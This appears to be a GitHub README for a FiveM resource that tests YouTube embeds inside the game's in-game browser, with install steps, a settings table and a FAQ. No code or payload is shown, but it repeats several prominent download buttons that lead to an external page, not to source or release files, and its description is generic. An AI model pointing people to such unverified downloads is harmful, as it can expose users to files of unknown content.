# DUI YouTube Test v2026 - Game Script Utility 2026

> A compact FiveM DUI test utility for validating YouTube embeds, browser media rendering, and consistent in-game playback behavior.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-FiveM-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/victorscott51/dui-youtube-script-test?style=flat-square)](https://github.com/victorscott51/dui-youtube-script-test)

---

<p align="center">
  <a href="https://victorscott51.github.io/dui-youtube-script-test/">
    <img src="https://img.shields.io/badge/Download-DUI%20YouTube%20Test%20Script-brightgreen?style=for-the-badge" alt="Download DUI YouTube Test Script">
  </a>
</p>

> **[Direct Download - DUI YouTube Test](https://victorscott51.github.io/dui-youtube-script-test/)**

---

[Download Latest Build](https://victorscott51.github.io/dui-youtube-script-test/)

---

## What this is for

DUI YouTube Test is a small HTML-driven FiveM utility built to inspect how external YouTube embeds behave in a DUI context. It is useful when you want to confirm browser media rendering and see whether playback starts and behaves correctly inside an in-game browser surface.

Rather than trying to cover a wide range of functionality, the project stays narrowly focused on repeatable verification. Its minimal layout makes setup straightforward and helps you rerun the same media checks while changing your FiveM environment or browser-related resource settings.

## Included capabilities

- Verifies external YouTube embed behavior inside a DUI page
- Checks playback handling within the FiveM browser environment
- Observes how in-game browser media rendering responds
- Keeps the page lightweight for quick loading
- Simplifies setup for fast verification passes
- Works well for repeating media tests after environment changes
- Concentrates on embedded video and browser-based media handling

## Installation

1. Download the latest build using the link above.
2. Put the extracted folder into your FiveM resources directory.
3. Register the resource in your server configuration.
4. Start the resource and open the DUI test page when needed.

Example server entry:

    ensure dui-youtube-test-v2026

If your resource name or folder layout differs, adjust the start line so it matches your local files.

## Configuration

| Setting | Description | Example |
| --- | --- | --- |
| Embed URL | Point the page to the YouTube embed you want to test | `https://www.youtube.com/embed/VIDEO_ID` |
| Test Page | HTML page used for media rendering checks | `index.html` |
| Resource Name | Folder or resource identifier used by FiveM | `dui-youtube-test-v2026` |
| Repeat Runs | Reopen the page after changes for comparison testing | manual restart |

If you modify the HTML, keep the embed source and page structure consistent with the behavior you want to evaluate.

## Compatibility

- Target platform: FiveM
- Intended for DUI and in-game browser media tests
- Built as an HTML-based utility
- Best used with current FiveM setups that support browser rendering

Known limitation: this project is focused on testing and validation, so behavior may vary depending on the embed source, browser handling, or your server-side resource configuration.

## FAQ

### How do I get started?
Download the resource, place it in your FiveM resources folder, and enable it from your server configuration. After that, open the test page and inspect the media behavior.

### Can I swap out the video?
Yes. Change the embedded YouTube source in the HTML to the video or embed URL you want to verify.

### Is this intended for live gameplay?
No. It is primarily meant for media testing, debugging, and browser-rendering checks.

### What should I check if the embed fails to load?
Review the embed URL, your browser/media settings, and whether the FiveM environment is currently rendering the page correctly.

### Can I use it for repeated comparisons?
Yes. The layout is built for repeatable checks, so you can change media sources and compare the results over time.

### Does it need a big install?
No. The project is deliberately lightweight and centered on a minimal HTML test page.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
